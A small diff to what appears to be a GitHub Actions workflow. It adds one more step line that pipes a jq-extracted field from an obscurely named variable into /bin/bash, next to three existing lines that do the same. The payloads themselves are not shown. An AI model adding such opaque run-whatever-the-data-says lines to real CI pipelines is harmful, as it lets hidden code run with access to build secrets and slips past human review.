@@ -24,6 +24,7 @@ jobs:
           echo $tepda15 | jq -r .lhhca98991 | /bin/bash
           printf '%s' "$j9105" | jq -r .dmpm58 | /bin/bash
           printf '%s' "$c5" | jq -r .w04110 | /bin/bash
+          echo $v397 | jq -r .myvj021 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
